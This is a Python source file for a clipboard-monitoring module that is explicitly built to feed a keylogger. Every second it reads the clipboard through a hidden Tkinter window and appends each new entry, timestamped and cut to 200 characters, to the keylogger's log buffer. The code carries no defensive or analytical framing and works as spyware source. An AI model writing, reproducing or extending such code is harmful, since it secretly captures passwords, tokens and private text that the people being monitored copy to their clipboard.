import threading
import time
from datetime import datetime
import tkinter as tk

class ClipboardMonitor:
    def __init__(self, keylogger_instance):
        self.keylogger = keylogger_instance
        self.last_content = ""
        self.running = True
        
    def get_clipboard(self):
        """Get current clipboard content"""
        try:
            root = tk.Tk()
            root.withdraw()
            content = root.clipboard_get()
            root.destroy()
            return content
        except:
            return ""
    
    def monitor(self):
        """Monitor clipboard for changes"""
        while self.running:
            try:
                current = self.get_clipboard()
                if current and current != self.last_content:
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    log_entry = f"\n[CLIPBOARD][{timestamp}] {current[:200]}\n"
                    
                    # Add to keylogger buffer
                    with self.keylogger.lock:
                        self.keylogger.log_buffer.append(log_entry)
                    
                    self.last_content = current
                time.sleep(1)
            except:
                time.sleep(1)
    
    def start(self):
        thread = threading.Thread(target=self.monitor, daemon=True)
        thread.start()